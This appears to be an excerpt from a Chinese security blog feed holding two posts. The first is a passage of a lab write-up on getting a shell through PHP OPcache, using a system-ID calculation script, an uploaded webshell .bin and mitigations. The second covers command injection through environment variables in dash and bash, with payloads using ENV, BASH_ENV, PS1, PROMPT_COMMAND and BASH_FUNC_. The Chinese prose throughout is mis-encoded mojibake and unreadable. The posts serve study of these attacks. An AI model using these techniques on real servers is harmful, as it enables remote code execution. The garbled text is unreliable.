<p>å¦‚æœè¦åŒ…å«æ–‡ä»¶çš„è¯å°±è¦çŸ¥é“è·¯å¾„ä¸­çš„md5å€¼ï¼ŒæŸ¥é˜…èµ„æ–™å¯çŸ¥ï¼Œè¿™ä¸ªmd5è¢«ç§°ä¸º <code>system id</code>,å®ƒçš„è®¡ç®—ç®—æ³•æ˜¯å›ºå®šçš„ï¼Œç”±phpç‰ˆæœ¬å·ã€zend extension idã€Zend Bin IDï¼Œè¿™ä¸‰æ ·æ‹¼æ¥èµ·æ¥md5å³å¯ï¼Œè€Œè¿™3ç§ä¸œè¥¿æ­£å¥½å…¨éƒ½åœ¨phpinfoé‡Œå¯ä»¥æ‹¿åˆ°ï¼Œå¯ä»¥ä½¿ç”¨è¯¥è„šæœ¬ä¸€é”®è®¡ç®—ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#!/usr/bin/env python2</span><br><br><span class="hljs-comment"># Copyright (c) 2016, 2019 GoSecure Inc.</span><br><br>import sys<br><span class="hljs-keyword">from</span> packaging import version<br>import re<br>import requests<br><br>def <span class="hljs-title function_ invoke__">md5</span>(data):<br>    <span class="hljs-keyword">if</span> <span class="hljs-title function_ invoke__">type</span>(data) is str:<br>        data = <span class="hljs-title function_ invoke__">bytes</span>(data, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">__import__</span>(<span class="hljs-string">&#x27;hashlib&#x27;</span>).<span class="hljs-title function_ invoke__">md5</span>(data).<span class="hljs-title function_ invoke__">hexdigest</span>()<br><br><span class="hljs-keyword">if</span> <span class="hljs-title function_ invoke__">len</span>(sys.argv) != <span class="hljs-number">2</span>:<br>    <span class="hljs-keyword">print</span>(sys.argv[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot; [file|URL]&quot;</span>)<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">if</span> (sys.argv[<span class="hljs-number">1</span>].<span class="hljs-title function_ invoke__">startswith</span>(<span class="hljs-string">&quot;http&quot;</span>)):<br>    text = requests.<span class="hljs-title function_ invoke__">get</span>(sys.argv[<span class="hljs-number">1</span>]).text<br><span class="hljs-keyword">else</span>:<br>    with <span class="hljs-title function_ invoke__">open</span>(sys.argv[<span class="hljs-number">1</span>]) <span class="hljs-keyword">as</span> file:<br>        text = file.<span class="hljs-title function_ invoke__">read</span>()<br>        file.<span class="hljs-title function_ invoke__">close</span>()<br><br><span class="hljs-comment"># PHP Version</span><br>php_version = re.<span class="hljs-title function_ invoke__">search</span>(<span class="hljs-string">&#x27;&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;PHP Version &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;(.*) &lt;/td&gt;&lt;/tr&gt;&#x27;</span>, text)<br><br><span class="hljs-keyword">if</span> php_version == None:<br>    php_version = re.<span class="hljs-title function_ invoke__">search</span>(<span class="hljs-string">&#x27;&lt;h1 class=&quot;p&quot;&gt;PHP Version (.*)&#x27;</span>, text)<br><br><span class="hljs-keyword">if</span> php_version == None:<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;No PHP version found, is this a phpinfo file?&quot;</span>)<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>)<br><br>php_version = php_version.<span class="hljs-title function_ invoke__">group</span>(<span class="hljs-number">1</span>)<br>php_greater_74 = (version.<span class="hljs-title function_ invoke__">parse</span>(<span class="hljs-string">&quot;7.4.0&quot;</span>) &lt; version.<span class="hljs-title function_ invoke__">parse</span>(php_version.<span class="hljs-title function_ invoke__">split</span>(<span class="hljs-string">&quot;-&quot;</span>)[<span class="hljs-number">0</span>]))<br><span class="hljs-comment"># Zend Extension Build ID</span><br>zend_extension_id = re.<span class="hljs-title function_ invoke__">search</span>(<span class="hljs-string">&#x27;&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;Zend Extension Build &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;(.*) &lt;/td&gt;&lt;/tr&gt;&#x27;</span>, text)<br><span class="hljs-keyword">if</span> zend_extension_id == None:<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;No Zend Extension Build found.&quot;</span>)<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>)<br>zend_extension_id = zend_extension_id.<span class="hljs-title function_ invoke__">group</span>(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># Architecture</span><br>architecture = re.<span class="hljs-title function_ invoke__">search</span>(<span class="hljs-string">&#x27;&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;System &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;(.*) &lt;/td&gt;&lt;/tr&gt;&#x27;</span>, text)<br><span class="hljs-keyword">if</span> architecture == None:<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;No System info found.&quot;</span>)<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>)<br>architecture = architecture.<span class="hljs-title function_ invoke__">group</span>(<span class="hljs-number">1</span>).<span class="hljs-title function_ invoke__">split</span>()[-<span class="hljs-number">1</span>]<br><br><span class="hljs-comment"># Zend Bin ID suffix</span><br><span class="hljs-keyword">if</span> architecture == <span class="hljs-string">&quot;x86_64&quot;</span>:<br>    bin_id_suffix = <span class="hljs-string">&quot;48888&quot;</span><br><span class="hljs-keyword">else</span>:<br>    bin_id_suffix = <span class="hljs-string">&quot;44444&quot;</span><br><br><span class="hljs-comment"># With PHP 7.4 they fixed the undefined macro that did the weird bin ID</span><br><span class="hljs-keyword">if</span> php_greater_74:<br>    zend_bin_id = <span class="hljs-string">&quot;BIN_&quot;</span> + bin_id_suffix<br><span class="hljs-keyword">else</span>:<br>    zend_bin_id = <span class="hljs-string">&quot;BIN_SIZEOF_CHAR&quot;</span> + bin_id_suffix<br><br><span class="hljs-comment"># Alternate Bin ID, see #5</span><br><span class="hljs-keyword">if</span> not php_greater_74:<br>    <span class="hljs-keyword">if</span> architecture == <span class="hljs-string">&quot;x86_64&quot;</span>:<br>        alt_bin_id_suffix = <span class="hljs-string">&quot;148888&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        alt_bin_id_suffix = <span class="hljs-string">&quot;144444&quot;</span><br><br>    alt_zend_bin_id = <span class="hljs-string">&quot;BIN_&quot;</span> + alt_bin_id_suffix<br><br><br><span class="hljs-comment"># Logging</span><br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;PHP version : &quot;</span> + php_version)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;Zend Extension ID : &quot;</span> + zend_extension_id)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;Zend Bin ID : &quot;</span> + zend_bin_id)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;Assuming &quot;</span> + architecture + <span class="hljs-string">&quot; architecture&quot;</span>)<br><br>digest = <span class="hljs-title function_ invoke__">md5</span>(php_version + zend_extension_id + zend_bin_id)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;------------&quot;</span>)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;System ID : &quot;</span> + digest)<br><br><span class="hljs-keyword">if</span> not php_greater_74:<br>    alt_digest = <span class="hljs-title function_ invoke__">md5</span>(php_version + zend_extension_id + alt_zend_bin_id)<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;PHP lower than 7.4 detected, an alternate Bin ID is possible:&quot;</span>)<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;Alternate Zend Bin ID : &quot;</span> + alt_zend_bin_id)<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;Alternate System ID : &quot;</span> + alt_digest)<br></code></pre></td></tr></table></figure>

<p>å¾—åˆ°<code>System ID : 0b8bd94e9858e5d32d058dc0acf75014</code></p>
<p><img src="/img/php/php-opcache-2.png"></p>
<p>åŒ…å«<code>flag.php.bin</code>å³å¯</p>
<p><img src="/img/php/php-opcache-3.png"></p>
<h1 id="äºŒï¼šopcacheç¼“å­˜-æ–‡ä»¶ä¸Šä¼ "><a href="#äºŒï¼šopcacheç¼“å­˜-æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="äºŒï¼šopcacheç¼“å­˜+æ–‡ä»¶ä¸Šä¼ "></a>äºŒï¼šopcacheç¼“å­˜+æ–‡ä»¶ä¸Šä¼ </h1><p>é¶æœºï¼š<code>lewiserii/php7-opcache-upload</code>    &#x2F;&#x2F;å…³é—­æ—¶é—´æˆ³éªŒè¯</p>
<p>é¦–é¡µæ˜¯ä¸ªæ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œå¯ä»¥è‡ªå®šä¹‰ä¸Šä¼ ç›®å½•ï¼Œç®€å•æµ‹è¯•åå‘ç°<code>/var/www/html</code>ç›®å½•æ²¡æœ‰æƒé™</p>
<p>åŒæ—¶ç»™äº†ä¸ª<code>phpinfo.php</code>ï¼ŒæŸ¥çœ‹opcacheçŠ¶æ€ï¼Œå‘ç°æ˜¯å¯ç”¨çŠ¶æ€ï¼Œç›´æ¥è·‘è„šæœ¬ç®—<code>system id</code></p>
<p>æ»¡è¶³è¿™å‡ ä¸ªæ¡ä»¶å°±å¯ä»¥ä¸Šä¼ æœ¨é©¬binæ–‡ä»¶åˆ°ç¼“å­˜ç›®å½•ï¼Œè¦†ç›–åè¾¾åˆ°getshellçš„ç›®çš„</p>
<p><img src="/img/php/php-opcache-4.png"></p>
<p>å¾—åˆ°ç¼“å­˜ç›®å½•ä¸º<code>/tmp/opcache/0b8bd94e9858e5d32d058dc0acf75014/var/www/html</code></p>
<p>æœ¬åœ°æ­å»ºä¸€ä¸ªopcacheç¯å¢ƒï¼Œå†™ä¸Šä¸€å¥è¯æœ¨é©¬ï¼ŒæŠŠç”Ÿæˆçš„<code>index.php.bin</code>æ‹¿ä¸‹æ¥</p>
<p><img src="/img/php/php-opcache-5.png"></p>
<p>å°†å›¾ä¸­çº¢æ¡†éƒ¨åˆ†çš„æœ¬åœ°<code>system id</code>æ›¿æ¢æˆé¶æœºç®—å‡ºæ¥çš„<code>system id</code></p>
<p><img src="/img/php/php-opcache-6.png"></p>
<p>ä¸Šä¼ </p>
<p><img src="/img/php/php-opcache-7.png"></p>
<p>å†æ¬¡è®¿é—®<code>index.php</code>ï¼Œå‘ç°å†…å®¹å·²è¢«è¦†ç›–</p>
<p><img src="/img/php/php-opcache-8.png"></p>
<h1 id="ä¸‰ï¼šä¿®å¤æ–¹å¼"><a href="#ä¸‰ï¼šä¿®å¤æ–¹å¼" class="headerlink" title="ä¸‰ï¼šä¿®å¤æ–¹å¼"></a>ä¸‰ï¼šä¿®å¤æ–¹å¼</h1><h2 id="file-cache-only"><a href="#file-cache-only" class="headerlink" title="file_cache_only"></a>file_cache_only</h2><p>å¦‚æœå†…å­˜ç¼“å­˜æ–¹å¼çš„ä¼˜å…ˆçº§é«˜äºæ–‡ä»¶ç¼“å­˜ï¼Œé‚£ä¹ˆé‡å†™åçš„ OPcache æ–‡ä»¶ï¼ˆwebshellï¼‰æ˜¯ä¸ä¼šè¢«æ‰§è¡Œçš„ã€‚ä½†æ˜¯ï¼Œå½“ Web æœåŠ¡å™¨é‡å¯åï¼Œå°±å¯ä»¥ç»•è¿‡æ­¤é™åˆ¶ã€‚å› ä¸ºï¼Œå½“æœåŠ¡å™¨é‡å¯ä¹‹åï¼Œå†…å­˜ä¸­çš„ç¼“å­˜ä¸ºç©ºï¼Œæ­¤æ—¶ï¼ŒOPcache ä¼šä½¿ç”¨æ–‡ä»¶ç¼“å­˜çš„æ•°æ®å¡«å……å†…å­˜ç¼“å­˜çš„æ•°æ®ï¼Œè¿™æ ·ï¼Œwebshell å°±å¯ä»¥è¢«æ‰§è¡Œäº†ã€‚</p>
<h2 id="validate-timestamp"><a href="#validate-timestamp" class="headerlink" title="validate_timestamp"></a>validate_timestamp</h2><p>å½“<code>opcache.validate_timestamps=1</code>æ—¶ï¼Œbinæ–‡ä»¶åœ¨åˆ›å»ºæ—¶ä¼šåœ¨æ–‡ä»¶å†…å®¹ä¸­å†™å…¥ä¸€ä¸ªæ—¶é—´æˆ³ï¼Œè¿™ä¸ªæ—¶é—´æˆ³è·Ÿæºæ–‡ä»¶ä¸€æ ·ï¼Œåœ¨æ‰§è¡Œbinæ–‡ä»¶ä¹‹å‰phpä¼šæ£€æŸ¥æ—¶é—´æˆ³æ˜¯å¦ä¸€è‡´ï¼Œå¦‚æœä¸ä¸€è‡´åˆ™ä¸¢å¼ƒé‡æ–°åˆ›å»ºbinæ–‡ä»¶ã€‚</p>
<p><img src="/img/php/php-opcache-9.png"></p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>opcache</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¯å¢ƒå˜é‡æ³¨å…¥</title>
    <url>/posts/7b50f6ef/</url>
    <content><![CDATA[<p>è¿™ç¯‡æ–‡ç« åªæ˜¯å¯¹pç‰›çš„ <a href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">æˆ‘æ˜¯å¦‚ä½•åˆ©ç”¨ç¯å¢ƒå˜é‡æ³¨å…¥æ‰§è¡Œä»»æ„å‘½ä»¤</a> è¿™ç¯‡æ–‡ç« è¿›è¡Œæ€»ç»“</p>
<p>ç¯å¢ƒå˜é‡æ³¨å…¥æ¡ä»¶ï¼šç”¨æˆ·å¯ä»¥æ§åˆ¶ç¯å¢ƒå˜é‡ï¼Œæœ‰æ‰§è¡Œå‘½ä»¤çš„ç‚¹ä½†å‘½ä»¤ä¸å¯æ§</p>
<p>ä¾‹å­ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;envs&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$val</span>) &#123;<br>    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;<span class="hljs-subst">&#123;$key&#125;</span>=<span class="hljs-subst">&#123;$val&#125;</span>&quot;</span>);<br>&#125;<br><span class="hljs-comment">//... ä¸€äº›å…¶ä»–ä»£ç </span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;echo hello&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>å…¶ä¸­PHPçš„systemè°ƒç”¨çš„æ˜¯ç³»ç»Ÿçš„popen()ï¼Œè€Œpopen()æœ€ç»ˆæ‰§è¡Œçš„æ˜¯<code>sh -c &quot;echo hello&quot;</code></p>
</blockquote>
<blockquote>
<p>shé€šå¸¸åªæ˜¯ä¸€ä¸ªè½¯è¿æ¥ã€‚åœ¨debianç³»æ“ä½œç³»ç»Ÿä¸­ï¼ŒshæŒ‡å‘dashï¼›åœ¨centosç³»æ“ä½œç³»ç»Ÿä¸­ï¼ŒshæŒ‡å‘bashã€‚</p>
</blockquote>
<h1 id="dash"><a href="#dash" class="headerlink" title="dash"></a>dash</h1><p><a href="http://archive.ubuntu.com/ubuntu/pool/main/d/dash/dash_0.5.10.2.orig.tar.gz">dashæºç </a></p>
<h2 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h2><p>mainå‡½æ•°æœ‰å…³ç¯å¢ƒå˜é‡çš„ä»£ç ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> linux</span><br>		getuid() == geteuid() &amp;&amp; getgid() == getegid() &amp;&amp;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>		iflag<br>	) &#123;<br>		<span class="hljs-keyword">if</span> ((shinit = lookupvar(<span class="hljs-string">&quot;ENV&quot;</span>)) != <span class="hljs-literal">NULL</span> &amp;&amp; *shinit != <span class="hljs-string">&#x27;\0&#x27;</span>) &#123;<br>			read_profile(shinit);<br>		&#125;<br>	&#125;<br></code></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ä»£ç ä¼šå…ˆåˆ¤æ–­<code>iflag</code>çš„å€¼</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> iflag optlist[3]</span><br><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> optletters[NOPTS] = &#123;<br>	<span class="hljs-string">&#x27;e&#x27;</span>,<br>	<span class="hljs-string">&#x27;f&#x27;</span>,<br>	<span class="hljs-string">&#x27;I&#x27;</span>,<br>	<span class="hljs-string">&#x27;i&#x27;</span>,<br>	<span class="hljs-string">&#x27;m&#x27;</span>,<br>	<span class="hljs-string">&#x27;n&#x27;</span>,<br>	<span class="hljs-string">&#x27;s&#x27;</span>,<br>	<span class="hljs-string">&#x27;x&#x27;</span>,<br>	<span class="hljs-string">&#x27;v&#x27;</span>,<br>	<span class="hljs-string">&#x27;V&#x27;</span>,<br>	<span class="hljs-string">&#x27;E&#x27;</span>,<br>	<span class="hljs-string">&#x27;C&#x27;</span>,<br>	<span class="hljs-string">&#x27;a&#x27;</span>,<br>	<span class="hljs-string">&#x27;b&#x27;</span>,<br>	<span class="hljs-string">&#x27;u&#x27;</span>,<br>	<span class="hljs-number">0</span>,<br>	<span class="hljs-number">0</span>,<br>&#125;;<br><br>options(<span class="hljs-type">int</span> cmdline)<br>&#123;<br>	<span class="hljs-type">char</span> *p;<br>	<span class="hljs-type">int</span> val;<br>	<span class="hljs-type">int</span> c;<br>	<span class="hljs-type">int</span> login = <span class="hljs-number">0</span>;<br><br>	<span class="hljs-keyword">if</span> (cmdline)<br>		minusc = <span class="hljs-literal">NULL</span>;<br>	<span class="hljs-keyword">while</span> ((p = *argptr) != <span class="hljs-literal">NULL</span>) &#123;<br>		argptr++;<br>		<span class="hljs-keyword">if</span> ((c = *p++) == <span class="hljs-string">&#x27;-&#x27;</span>) &#123;<br>			val = <span class="hljs-number">1</span>;<br>      <span class="hljs-comment">/* ....  */</span><br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;+&#x27;</span>) &#123;<br>			val = <span class="hljs-number">0</span>;<br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			argptr--;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br>		<span class="hljs-keyword">while</span> ((c = *p++) != <span class="hljs-string">&#x27;\0&#x27;</span>) &#123;<br>			<span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;c&#x27;</span> &amp;&amp; cmdline) &#123;<br>				minusc = p;	<span class="hljs-comment">/* command is after shell args*/</span><br>			&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;l&#x27;</span> &amp;&amp; cmdline) &#123;<br>				login = <span class="hljs-number">1</span>;<br>			&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;o&#x27;</span>) &#123;<br>				minus_o(*argptr, val);<br>				<span class="hljs-keyword">if</span> (*argptr)<br>					argptr++;<br>			&#125; <span class="hljs-keyword">else</span> &#123;<br>				setoption(c, val);<br>			&#125;<br>		&#125;<br>	&#125;<br><br>	<span class="hljs-keyword">return</span> login;<br>&#125;<br><br><br>setoption(<span class="hljs-type">int</span> flag, <span class="hljs-type">int</span> val)<br>&#123;<br>	<span class="hljs-type">int</span> i;<br><br>	<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; NOPTS; i++)<br>		<span class="hljs-keyword">if</span> (optletters[i] == flag) &#123;<br>			optlist[i] = val;<br>			<span class="hljs-keyword">if</span> (val) &#123;<br>				<span class="hljs-comment">/* #%$ hack for ksh semantics */</span><br>				<span class="hljs-keyword">if</span> (flag == <span class="hljs-string">&#x27;V&#x27;</span>)<br>					Eflag = <span class="hljs-number">0</span>;<br>				<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (flag == <span class="hljs-string">&#x27;E&#x27;</span>)<br>					Vflag = <span class="hljs-number">0</span>;<br>			&#125;<br>			<span class="hljs-keyword">return</span>;<br>		&#125;<br>	sh_error(<span class="hljs-string">&quot;Illegal option -%c&quot;</span>, flag);<br>	<span class="hljs-comment">/* NOTREACHED */</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>é€šè¿‡ä»¥ä¸Šä»£ç å¯ä»¥çŸ¥é“<code>setoption</code>å‡½æ•°ä¼šè§£æä¼ å…¥çš„å‚æ•°ï¼Œå½“ä¼ å…¥äº†<code>-i</code>æ—¶ï¼Œ<code>iflag</code>å°±ä¸º<code>1</code>äº†</p>
<p>ç»“è®ºï¼šæ‰€ä»¥åœ¨dashä¸­éœ€è¦ä¼ å…¥<code>-i</code>å‚æ•°æ‰èƒ½æ‰§è¡Œ<code>read_profile(shinit)</code>ï¼Œè§£æ<code>ENV</code>å˜é‡ã€‚ä½†åœ¨phpçš„<code>system</code>å‡½æ•°ä¸­ä¸èƒ½ä½¿ç”¨</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">ENV=<span class="hljs-string">&#x27;$(id 1&gt;&amp;2)&#x27;</span> dash -i -c <span class="hljs-string">&#x27;echo hello&#x27;</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/linux/linux-sh-1.png"></p>
<h2 id="PS1ã€PS4"><a href="#PS1ã€PS4" class="headerlink" title="PS1ã€PS4"></a>PS1ã€PS4</h2><p>PS1ã€PS2ã€PS4è¿™ä¸‰ä¸ªç¯å¢ƒå˜é‡ä¹Ÿä¼šè¢«expandstrå‡½æ•°è§£æ</p>
<p>ä½†æ˜¯PS1æœ‰é™åˆ¶ï¼Œéœ€è¦è¿›å…¥äº¤äº’å¼shellä¸­æ‰èƒ½æ‰§è¡Œ</p>
<p><img src="/img/linux/linux-sh-2.png"></p>
<p>PS4åˆ™åªèƒ½è§£æå˜é‡ï¼Œæ— æ³•æ‰§è¡Œå‘½ä»¤</p>
<p><img src="/img/linux/linux-sh-3.png"></p>
<h1 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h1><p><a href="https://git.savannah.gnu.org/cgit/bash.git/">bashæºç </a></p>
<h2 id="BASH-ENV"><a href="#BASH-ENV" class="headerlink" title="BASH_ENV"></a>BASH_ENV</h2><p>åœ¨bashä¸­æœ‰ä¸ªå’ŒENVç±»ä¼¼çš„å˜é‡ï¼šBASH_ENV</p>
<p>ç›´æ¥é‚£ä¸Šé¢çš„payloadæ”¹ï¼š<code>BASH_ENV=&#39;$(id 1&gt;&amp;2)&#39; bash -c &#39;echo hello&#39;</code></p>
<p>å¯ä»¥å‘ç°ä¸éœ€è¦-iä¹Ÿèƒ½æ‰§è¡Œäº†</p>
<p><img src="/img/linux/linux-sh-4.png"></p>
<p>åˆ†æè¿™æ®µä»£ç </p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"> <span class="hljs-comment">/* A non-interactive shell not named `sh&#x27; and not in posix mode reads and</span><br><span class="hljs-comment">    executes commands from $BASH_ENV.  If `su&#x27; starts a shell with `-c cmd&#x27;</span><br><span class="hljs-comment">    and `-su&#x27; as the name of the shell, we want to read the startup files.</span><br><span class="hljs-comment">    No other non-interactive shells read any startup files. */</span><br> <span class="hljs-keyword">if</span> (interactive_shell == <span class="hljs-number">0</span> &amp;&amp; !(su_shell &amp;&amp; login_shell))<br>   &#123;<br>     <span class="hljs-keyword">if</span> (posixly_correct == <span class="hljs-number">0</span> &amp;&amp; act_like_sh == <span class="hljs-number">0</span> &amp;&amp; privileged_mode == <span class="hljs-number">0</span> &amp;&amp;<br>    sourced_env++ == <span class="hljs-number">0</span>)<br>execute_env_file (get_string_value (<span class="hljs-string">&quot;BASH_ENV&quot;</span>));<br>     <span class="hljs-keyword">return</span>;<br>   &#125;<br></code></pre></td></tr></table></figure>


<p>ä»æ³¨é‡Šä¸­å¯ä»¥çœ‹åˆ°ï¼Œå½“ä½¿ç”¨shæ—¶ï¼Œ<code>act_like_sh</code>çš„å€¼ä¼šä¸º1ï¼Œå°±ä¸ä¼šè§£æBASH_ENVäº†</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (shell_name[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;s&#x27;</span> &amp;&amp; shell_name[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;h&#x27;</span> &amp;&amp; shell_name[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;\0&#x27;</span>)<br>  act_like_sh++;<br><span class="hljs-keyword">if</span> (shell_name[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;s&#x27;</span> &amp;&amp; shell_name[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;u&#x27;</span> &amp;&amp; shell_name[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;\0&#x27;</span>)<br>  su_shell++;<br></code></pre></td></tr></table></figure>

<p>æ‰€ä»¥åªèƒ½åœ¨bash -cçš„æƒ…å†µä¸‹ä½¿ç”¨</p>
<h2 id="ENV-PS1-PROMPT-COMMAND"><a href="#ENV-PS1-PROMPT-COMMAND" class="headerlink" title="ENV PS1 PROMPT_COMMAND"></a>ENV PS1 PROMPT_COMMAND</h2><p>ä¸dashåŒæ ·ï¼ŒENV PS1ä¹Ÿèƒ½ä½¿ç”¨</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><br>      <span class="hljs-comment">/* bash */</span><br>      <span class="hljs-keyword">if</span> (act_like_sh == <span class="hljs-number">0</span> &amp;&amp; no_rc == <span class="hljs-number">0</span>)<br>	&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> SYS_BASHRC</span><br><span class="hljs-meta">#  <span class="hljs-keyword">if</span> defined (__OPENNT)</span><br>	  maybe_execute_file (_prefixInstallPath(SYS_BASHRC, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>), <span class="hljs-number">1</span>);<br><span class="hljs-meta">#  <span class="hljs-keyword">else</span></span><br>	  maybe_execute_file (SYS_BASHRC, <span class="hljs-number">1</span>);<br><span class="hljs-meta">#  <span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>	  maybe_execute_file (bashrc_file, <span class="hljs-number">1</span>);<br>	&#125;<br>      <span class="hljs-comment">/* sh */</span><br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (act_like_sh &amp;&amp; privileged_mode == <span class="hljs-number">0</span> &amp;&amp; sourced_env++ == <span class="hljs-number">0</span>)<br>	execute_env_file (get_string_value (<span class="hljs-string">&quot;ENV&quot;</span>));<br>    &#125;<br>  <span class="hljs-keyword">else</span>		<span class="hljs-comment">/* bash --posix, sh --posix */</span><br>    &#123;<br>      <span class="hljs-comment">/* bash and sh */</span><br>      <span class="hljs-keyword">if</span> (interactive_shell &amp;&amp; privileged_mode == <span class="hljs-number">0</span> &amp;&amp; sourced_env++ == <span class="hljs-number">0</span>)<br>	execute_env_file (get_string_value (<span class="hljs-string">&quot;ENV&quot;</span>));<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>ä¸è¿‡å¿…é¡»æ˜¯é€šè¿‡shè°ƒç”¨ï¼Œè€Œä¸æ˜¯ç›´æ¥ä½¿ç”¨bash</p>
<p><code>ENV=&#39;$(id 1&gt;&amp;2)&#39; sh -i -c &quot;echo hello&quot;</code></p>
<p>PS1ç”¨æ³•ä¸€æ ·ã€‚åœ¨bashä¸­è¿˜æœ‰ä¸€ä¸ªå˜é‡<code>PROMPT_COMMAND</code>ï¼Œè®¾ç½®äº†è¿™ä¸ªç¯å¢ƒå˜é‡åï¼Œè¿›å…¥äº¤äº’å¼æ¨¡å¼å‰ï¼Œä¼šæ‰§è¡Œè¿™ä¸ªå˜é‡é‡ŒåŒ…å«çš„å‘½ä»¤</p>
<p><code>PROMPT_COMMAND=&#39;id&#39; bash</code></p>
<h2 id="BASH-FUNC-xxx"><a href="#BASH-FUNC-xxx" class="headerlink" title="BASH_FUNC_xxx%%"></a>BASH_FUNC_xxx%%</h2><p>variables.cçš„initialize_shell_variableså‡½æ•°ç”¨äºå°†ç¯å¢ƒå˜é‡æ³¨å†ŒæˆSHELLçš„å˜é‡</p>
<p><img src="/img/linux/linux-sh-5.jpg"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BASHFUNC_PREFIX		<span class="hljs-string">&quot;BASH_FUNC_&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BASHFUNC_PREFLEN	10	<span class="hljs-comment">/* == strlen(BASHFUNC_PREFIX */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BASHFUNC_SUFFIX		<span class="hljs-string">&quot;%%&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BASHFUNC_SUFFLEN	2	<span class="hljs-comment">/* == strlen(BASHFUNC_SUFFIX) */</span></span><br></code></pre></td></tr></table></figure>

